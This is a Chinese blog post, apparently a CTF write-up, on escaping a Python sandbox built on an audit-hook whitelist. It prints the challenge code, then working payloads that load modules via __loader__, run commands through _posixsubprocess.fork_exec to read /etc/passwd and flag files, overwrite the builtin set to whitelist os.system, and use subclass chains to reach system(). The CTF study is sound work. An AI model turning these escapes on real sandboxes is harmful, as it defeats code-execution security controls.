> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [dummykitty.github.io](https://dummykitty.github.io/posts/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook/)

> 绕过 audit hook Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。

绕过 audit hook[](#绕过-audit-hook)
-------------------------------

Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。

Python 中的审计事件包括但不限于以下几类：

*   `import`：发生在导入模块时。
*   `open`：发生在打开文件时。
*   `write`：发生在写入文件时。
*   `exec`：发生在执行 Python 代码时。
*   `compile`：发生在编译 Python 代码时。
*   `socket`：发生在创建或使用网络套接字时。
*   `os.system`，`os.popen`等：发生在执行操作系统命令时。
*   `subprocess.Popen`，`subprocess.run`等：发生在启动子进程时。

[PEP 578 – Python Runtime Audit Hooks](https://peps.python.org/pep-0578/)

calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱, 采用白名单来进行限制. audit hook 属于 python 底层的实现, 因此常规的变换根本无法绕过.

题目源码如下:

```
import sys

def my_audit_hook(my_event, _):
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))

def my_input():
    dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)


def main():
  WELCOME = '''
  _                _                           _       _ _   _                _   __
 | |              (_)                         (_)     (_) | | |              | | / /
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | '_ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
              __/ |                          _/ |
             |___/                          |__/                                                                        
  '''

  CODE = '''
  dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)
  '''

  print(WELCOME)

  print("Welcome to the python jail")
  print("Let's have an beginner jail of calc")
  print("Enter your expression and I will evaluate it for you.")
  print("White list of audit hook ===> builtins.input,builtins.input/result,exec,compile")
  print("Some code of python jail:")
  print(CODE)
  my_input()

if __name__ == "__main__":
  sys.addaudithook(my_audit_hook)
  main()
```

这道题需要绕过的点有两个:

1.  绕过 import 导入模块. 如果直接使用 import, 就会触发 audithook
    
    ```
    > __import__('ctypes')
     Operation not permitted: import
    ```
    
2.  绕过常规的命令执行方法执行命令. 利用 os, subproccess 等模块执行命令时也会触发 audithook

### 调试技巧[](#调试技巧)

本地调试时可以在 hook 函数中添加打印出 hook 的类型.

```
def my_audit_hook(my_event, _):
    print(f'[+] {my_event}, {_}')
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))
```

这样在测试 payload 时就可以知道触发了哪些 hook

```
> import os
[+] builtins.input/result, ('import os',)
[+] compile, (b'import os', '<string>')
[+] exec, (<code object <module> at 0x7f966795bec0, file "<string>", line 1>,)
```

### `__loader__.load_module` 导入模块[](#__loader__load_module-导入模块)

`__loader__.load_module(fullname)` 也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.

```
__loader__.load_module('os')
```

`__loader__` 实际上指向的是 `_frozen_importlib.BuiltinImporter` 类, 也可以通过别的方式进行获取

```
>>> ().__class__.__base__.__subclasses__()[84]
<class '_frozen_importlib.BuiltinImporter'>
>>> __loader__
<class '_frozen_importlib.BuiltinImporter'>
>>> ().__class__.__base__.__subclasses__()[84].__name__
'BuiltinImporter'
>>> [x for x in ().__class__.__base__.__subclasses__() if 'BuiltinImporter' in x.__name__][0]
<class '_frozen_importlib.BuiltinImporter'>
```

`__loader__.load_module` 也有一个缺点就是无法导入非内建模块. 例如 socket

```
>>> __loader__.load_module('socket')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<frozen importlib._bootstrap>", line 290, in _load_module_shim
  File "<frozen importlib._bootstrap>", line 721, in _load
  File "<frozen importlib._bootstrap>", line 676, in _load_unlocked
  File "<frozen importlib._bootstrap>", line 573, in module_from_spec
  File "<frozen importlib._bootstrap>", line 776, in create_module
ImportError: 'socket' is not a built-in module
```

### _posixsubprocess 执行命令[](#_posixsubprocess-执行命令)

_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.

该模块的核心功能是 fork_exec 函数，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出, 每个版本的 Python 可能有所差异.

在我本地的 Python 3.11 中具体的函数声明如下:

```
def fork_exec(
    __process_args: Sequence[StrOrBytesPath] | None,
    __executable_list: Sequence[bytes],
    __close_fds: bool,
    __fds_to_keep: tuple[int, ...],
    __cwd_obj: str,
    __env_list: Sequence[bytes] | None,
    __p2cread: int,
    __p2cwrite: int,
    __c2pred: int,
    __c2pwrite: int,
    __errread: int,
    __errwrite: int,
    __errpipe_read: int,
    __errpipe_write: int,
    __restore_signals: int,
    __call_setsid: int,
    __pgid_to_set: int,
    __gid_object: SupportsIndex | None,
    __groups_list: list[int] | None,
    __uid_object: SupportsIndex | None,
    __child_umask: int,
    __preexec_fn: Callable[[], None],
    __allow_vfork: bool,
) -> int: ...
```

*   `__process_args`: 传递给新进程的命令行参数，通常为程序路径及其参数的列表。
*   `__executable_list`: 可执行程序路径的列表。
*   `__close_fds`: 如果设置为 True，则在新进程中关闭所有的文件描述符。
*   `__fds_to_keep`: 一个元组，表示在新进程中需要保持打开的文件描述符的列表。
*   `__cwd_obj`: 新进程的工作目录。
*   `__env_list`: 环境变量列表，它是键和值的序列，例如：[“PATH=/usr/bin”, “HOME=/home/user”]。
*   `__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite`: 这些是文件描述符，用于在父子进程间进行通信。
*   `__errpipe_read, __errpipe_write`: 这两个文件描述符用于父子进程间的错误通信。
*   `__restore_signals`: 如果设置为 1，则在新创建的子进程中恢复默认的信号处理。
*   `__call_setsid`: 如果设置为 1，则在新进程中创建新的会话。
*   `__pgid_to_set`: 设置新进程的进程组 ID。
*   `__gid_object, __groups_list, __uid_object`: 这些参数用于设置新进程的用户 ID 和组 ID。
*   `__child_umask`: 设置新进程的 umask。
*   `__preexec_fn`: 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。
*   `__allow_vfork`: 如果设置为 True，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。

下面是一个最小化示例:

```
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

结合上面的 `__loader__.load_module(fullname)` 可以得到最终的 payload:

```
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```

可以看到全程触发了 `builtins.input/result`, compile, exec 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的, `__loader__.load_module` 和 `_posixsubprocess` 都没有触发.

```
[+] builtins.input/result, ('__loader__.load_module(\'_posixsubprocess\').fork_exec([b"/bin/cat","/flag"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\'os\').pipe()), False, False,False, None, None, None, -1, None, False)',)
[+] compile, (b'__loader__.load_module(\'_posixsubprocess\').fork_exec([b"/bin/cat","/flag"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\'os\').pipe()), False, False,False, None, None, None, -1, None, False)', '<string>')
[+] exec, (<code object <module> at 0x7fbecc924670, file "<string>", line 1>,)
```

### 另一种解法: 篡改内置函数[](#另一种解法-篡改内置函数)

这道 audit hook 题还有另外一种解法. 可以看到白名单是通过 set 函数返回的, set 作为一个内置函数实际上也是可以修改的

```
WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
```

比如我们将 set 函数修改为固定返回一个包含了 os.system 函数的列表

```
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
```

这样 set 函数会固定返回带有 os.system 的列表.

```
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
```

最终 payload:

```
# 
exec("for k,v in enumerate(globals()['__builtins__']): print(k,v)")

# 篡改函数
exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag2.txt')")
```

### 其他不触发 hook 的方式[](#其他不触发-hook-的方式)

使用 `__loader__.load_module('os')` 是为了获取 os 模块, 其实在 no builtins 利用手法中, 无需导入也可以获取对应模块. 例如:

```
# 获取 sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"]

# 获取 os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"]

# 其他的 payload 也都不会触发
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
```

参考资料[](#参考资料)
-------------

*   [Python 沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
*   [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
*   [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
*   [python 沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
*   [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
*   [[PyJail] python 沙箱逃逸探究 · 上（HNCTF 题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
*   [[PyJail] python 沙箱逃逸探究 · 中（HNCTF 题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
*   [[PyJail] python 沙箱逃逸探究 · 下（HNCTF 题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
*   [audited2](https://ctftime.org/writeup/31883)
*   [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
*   [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
*   [Python 沙箱逃逸的 n 种姿势](https://ctftime.org/writeup/28286)
*   [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)